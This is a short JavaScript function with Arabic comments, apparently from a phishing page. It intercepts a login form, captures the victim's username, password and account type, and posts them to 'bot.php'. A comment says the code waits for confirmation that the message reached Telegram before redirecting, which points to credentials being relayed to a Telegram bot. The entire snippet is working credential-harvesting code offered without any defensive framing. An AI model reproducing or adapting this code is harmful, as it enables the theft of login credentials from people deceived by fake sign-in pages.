function submitStep1(event) {
    event.preventDefault();
    
    // إظهار دائرة التحميل فوراً
    document.getElementById('loader').style.display = 'flex';

    let data = {
        type: 'LOGIN',
        user: document.getElementById('user').value,
        pass: document.getElementById('pass').value,
        accType: document.getElementById('accType').value
    };

    // إرسال البيانات لملف PHP
    fetch('bot.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });

    // ملاحظة: لن نقوم بعمل "التحويل" الآن، سننتظر تأكيد وصول الرسالة لتيليجرام أولاً
}